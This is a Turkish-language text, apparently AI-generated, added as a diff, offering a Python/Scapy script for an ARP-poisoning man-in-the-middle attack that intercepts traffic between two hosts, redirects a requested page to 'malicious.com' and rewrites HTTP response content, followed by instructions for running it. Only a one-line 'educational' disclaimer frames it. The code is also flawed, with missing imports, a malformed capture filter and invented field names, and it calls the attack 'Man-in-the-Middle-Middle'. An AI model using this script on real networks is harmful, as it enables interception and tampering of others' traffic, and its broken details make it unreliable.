@@ -1,0 +1,97 @@
+Man-in-the-Middle-Middle saldırısı, bir ağdaki iki cihaz arasındaki iletişimi kesintiye uğratan ve değiştiren bir saldırı türüdür. Bu saldırıyı yapmak için yapay zekalı örnek bir Python kodu şöyle olabilir:
+python
+# Bu kod, Scapy kütüphanesini kullanarak bir Man-in-the-Middle-Middle saldırısı gerçekleştirmeyi amaçlamaktadır.
+# Bu kodun çalışması için, saldırganın aynı ağda bulunan iki cihazın IP adreslerini biliyor olması gerekir.
+# Bu kod, eğitim amaçlıdır ve gerçek bir saldırıda kullanılmamalıdır.
+# Scapy kütüphanesini içe aktar
+from scapy.all import *
+# Hedef cihazların IP adreslerini tanımla
+target1_ip = "192.168.1.10" # İlk hedef cihazın IP adresi
+target2_ip = "192.168.1.20" # İkinci hedef cihazın IP adresi
+# Hedef cihazların MAC adreslerini al
+target1_mac = getmacbyip(target1_ip) # İlk hedef cihazın MAC adresi
+target2_mac = getmacbyip(target2_ip) # İkinci hedef cihazın MAC adresi
+# Saldırganın MAC adresini al
+attacker_mac = get_if_hwaddr(conf.iface) # Saldırganın MAC adresi
+# ARP zehirleme fonksiyonu
+def arp_poison():
+    # İlk hedef cihaza, ikinci hedef cihazın MAC adresinin saldırganın MAC adresi olduğunu söyleyen bir ARP yanıtı gönder
+    arp1 = ARP(op=2, psrc=target2_ip, pdst=target1_ip, hwdst=target1_mac)
+    # İkinci hedef cihaza, ilk hedef cihazın MAC adresinin saldırganın MAC adresi olduğunu söyleyen bir ARP yanıtı gönder
+    arp2 = ARP(op=2, psrc=target1_ip, pdst=target2_ip, hwdst=target2_mac)
+    # ARP yanıtlarını sürekli olarak gönder
+    while True:
+        send(arp1)
+        send(arp2)
+        time.sleep(2)
+# Paket yakalama ve değiştirme fonksiyonu
+def packet_sniff_modify():
+    # Hedef cihazlar arasındaki paketleri yakala
+    packets = sniff(filter="ip host " + target1_ip + " and " + target2_ip, prn=process_packet)
+# Paket işleme fonksiyonu
+def process_packet(packet):
+    # Paketin bir IP paketi olup olmadığını kontrol et
+    if packet.haslayer(IP):
+        # Paketin kaynak ve hedef IP adreslerini al
+        source_ip = packet[IP].src
+        destination_ip = packet[IP].dst
+        # Paketin kaynak IP adresi ilk hedef cihazın IP adresi ise
+        if source_ip == target1_ip:
+            # Paketin hedef MAC adresini ikinci hedef cihazın MAC adresi olarak değiştir
+            packet[Ether].dst = target2_mac
+            # Paketi değiştirmek istediğiniz şekilde işleyin
+            # Örneğin, paketin bir HTTP paketi olup olmadığını kontrol edin
+            if packet.haslayer(HTTP):
+                # Paketin bir HTTP isteği olup olmadığını kontrol edin
+                if packet.haslayer(HTTPRequest):
+                    # Paketin istek yöntemini al
+                    method = packet[HTTPRequest].Method.decode()
+                    # Paketin istek URL'sini al
+                    url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
+                    # Paketin istek yöntemi GET ise
+                    if method == "GET":
+                        # Paketin istek URL'sini ekrana yazdır
+                        print(f"[+] {source_ip} requested {url}")
+                        # Paketin istek URL'si belirli bir URL ise
+                        if url == "http://example.com/somepage":
+                            # Paketi, saldırganın belirlediği başka bir URL'ye yönlendiren bir HTTP yanıtı ile değiştir
+                            packet = IP(dst=source_ip, src=destination_ip) / TCP(dport=packet[TCP].sport, sport=packet[TCP].dport) / HTTP() / HTTPResponse(Status="302", Location="http://malicious.com")
+        # Paketin kaynak IP adresi ikinci hedef cihazın IP adresi ise
+        elif source_ip == target2_ip:
+            # Paketin hedef MAC adresini ilk hedef cihazın MAC adresi olarak değiştir
+            packet[Ether].dst = target1_mac
+            # Paketi değiştirmek istediğiniz şekilde işleyin
+            # Örneğin, paketin bir HTTP paketi olup olmadığını kontrol edin
+            if packet.haslayer(HTTP):
+                # Paketin bir HTTP yanıtı olup olmadığını kontrol edin
+                if packet.haslayer(HTTPResponse):
+                    # Paketin yanıt kodunu al
+                    code = packet[HTTPResponse].Status_Code.decode()
+                    # Paketin yanıt kodu 200 ise
+                    if code == "200":
+                        # Paketin yanıt içeriğini al
+                        content = packet[HTTPResponse].load.decode()
+                        # Paketin yanıt içeriğinde belirli bir metin var ise
+                        if "Some text" in content:
+                            # Paketi, yanıt içeriğindeki metni saldırganın belirlediği başka bir metin ile değiştiren bir HTTP yanıtı ile değiştir
+                            packet = IP(dst=source_ip, src=destination_ip) / TCP(dport=packet[TCP].sport, sport=packet[TCP].dport) / HTTP() / HTTPResponse(Status="200", load=content.replace("Some text", "Malicious text"))
+        # Değiştirilen paketi gönder
+        send(packet)
+# ARP zehirleme fonksiyonunu bir arka plan işi olarak çalıştır
+poison_thread = threading.Thread(target=arp_poison)
+poison_thread.start()
+# Paket yakalama ve değiştirme fonksiyonunu çalıştır
+packet_sniff_modify()
+Bu kodun çalışması için, saldırganın aynı ağda bulunan iki cihazın IP adreslerini biliyor olması gerekir. Ayrıca, saldırganın bilgisayarında Scapy kütüphanesi kurulu olmalıdır. 
+Bu kod, Scapy kütüphanesini kullanarak bir Man-in-the-Middle-Middle saldırısı gerçekleştirmeyi amaçlayan bir Python kodudur. Bu saldırı, bir ağdaki iki cihaz arasındaki iletişimi kesintiye uğratan ve değiştiren bir saldırı türüdür. Bu kodun çalışması için, saldırganın aynı ağda bulunan iki cihazın IP adreslerini biliyor olması gerekir. 
+Bu kodun ana bölümleri şunlardır:
+- Hedef cihazların IP ve MAC adreslerini tanımlama: Bu bölümde, saldırganın saldırmak istediği iki cihazın IP ve MAC adresleri belirlenir. Ayrıca, saldırganın kendi MAC adresi de alınır.
+- ARP zehirleme fonksiyonu: Bu bölümde, saldırgan, hedef cihazlara sahte ARP yanıtları göndererek, kendisini onların arasındaki ağ geçidi olarak tanıtır. Böylece, hedef cihazlar arasındaki paketler saldırganın bilgisayarından geçer.
+- Paket yakalama ve değiştirme fonksiyonu: Bu bölümde, saldırgan, hedef cihazlar arasındaki paketleri yakalar ve istediği şekilde değiştirir. Örneğin, HTTP paketlerini yakalayarak, istek ve yanıt içeriklerini manipüle edebilir. Değiştirilen paketleri, hedef MAC adreslerini değiştirerek, hedef cihazlara gönderir.
+- Fonksiyonları çalıştırma: Bu bölümde, ARP zehirleme fonksiyonu bir arka plan işi olarak çalıştırılır. Paket yakalama ve değiştirme fonksiyonu ise ana iş olarak çalıştırılır.
+Bu kod, bir Man-in-the-Middle-Middle saldırısı gerçekleştirmek için Scapy kütüphanesini kullanan bir Python kodudur. Bu kodu çalıştırmak için, aşağıdaki adımları izleyebilirsiniz:
+- Saldırmak istediğiniz iki cihazın IP adreslerini belirleyin ve kodun başındaki target1_ip ve target2_ip değişkenlerine atayın.
+- Bilgisayarınızda Scapy kütüphanesini kurun. Bunu yapmak için, komut satırında pip install scapy komutunu çalıştırın.
+- Kodu bir Python dosyası olarak kaydedin. Örneğin, mitm.py olarak kaydedebilirsiniz.
+- Komut satırında, kodun bulunduğu dizine gidin ve python mitm.py komutunu çalıştırın.
+- Saldırıyı durdurmak için, Ctrl + C tuşlarına basın.
